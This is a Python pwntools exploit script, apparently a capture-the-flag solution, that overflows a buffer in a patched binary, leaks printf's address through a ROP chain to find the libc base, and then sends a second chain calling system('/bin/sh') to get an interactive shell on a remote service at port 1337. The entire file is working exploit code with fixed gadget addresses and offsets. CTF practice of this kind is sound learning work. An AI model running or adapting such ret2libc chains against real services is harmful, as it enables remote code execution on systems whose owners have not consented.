#!/usr/bin/env python3

from pwn import *

exe = ELF("./main_patched_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    rop = ROP(exe)
    offset = 24 - 8
    rop.raw(b"A" * offset)
    rop.raw(b"exit" + b"\x00" * 4)
    rop.rdi = exe.got['printf']
    rop.raw(0x000000000040101a)
    rop.raw(exe.plt['printf'])
    rop.raw(0x000000000040119b)
    r.send(rop.chain())
    recv = r.recv(8)
    addr = u64(recv[2:] + b"\x00" * 2)
    print(hex(addr))
    libc.address = addr - libc.sym['printf']
    # print(hex(libc.addr))
    # print(libc.addr)
    # print(hex(libc.addr))
    # print(libc.sym['printf'])
    # bin_sh = next(libc.search(b"/bin/sh\x00"))
    rop2 = ROP(libc)
    rop2.raw(b"A" * offset)
    rop2.raw(b"exit" + b"\x00" * 4)
    # rop2.rdi = bin_sh
    rop2.rdi = next(libc.search(b"/bin/sh\x00"))
    rop2.raw(0x000000000040101a)
    rop2.raw(libc.sym['system'])
    rop2.raw(libc.sym['exit'])
    sleep(3)
    r.send(rop2.chain())
    print(rop2.dump())
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
